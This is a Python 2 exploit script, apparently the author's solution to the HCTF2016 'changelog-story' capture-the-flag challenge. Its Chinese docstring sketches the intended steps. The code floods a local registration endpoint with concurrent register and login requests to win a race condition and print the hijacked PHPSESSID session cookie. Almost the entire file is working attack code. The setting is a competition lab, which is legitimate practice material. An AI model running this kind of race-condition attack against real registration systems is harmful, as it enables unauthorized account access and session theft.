#!/usr/bin/env python
# coding: utf-8
__author__ = 'Aklis'

"""
  竞争条件

  预期内的顺序
  1. 扫目录得到.git, 发现是空的，先怀疑一下人生。
  2. 但有.git存在，想想可能有什么git规范(README.md)，也有可能直接扫到。
  3. 阅读changelog，理解一下这个大头虾的程序员会作什么死。
  4. 留下一个中文的 苟 
  5. 开心吗
"""

import requests
import string
import re
import random
import threading
from pprint import pprint

url_register = "http://localhost/HCTF2016/changelog-story/register.php"
url_login = "http://localhost/HCTF2016/changelog-story/login.php"
url_index = "http://localhost/HCTF2016/changelog-story/index.php"

def register(data):
    requests.post(url_register, data=data)

def login(data):
	S = requests.Session()
	R = S.post(url_login, data=data)
	R = S.get(url_index)
	content = R.content
	content = re.findall(r"Hello", content, re.DOTALL)
	if len(content) > 0:
		print "[*] SESSION: ", S.cookies['PHPSESSID']
	else:
		print "[x] fail"

def main():
  while True:
      username = 'Aklis' + '' .join(random.choice(string.ascii_letters) for i in range(5))
      password = '123'
      data = { 'username' : username, 'password' : password , 'gogogo': '苟!'}
      t1 = threading.Thread(target=register, args=(data,))
      t2 = threading.Thread(target=login, args=(data,))
      t1.start()
      t2.start()
    
      t1.join()
      t2.join()

if __name__ == '__main__':
  import sys
  sys.exit(int(main() or 0))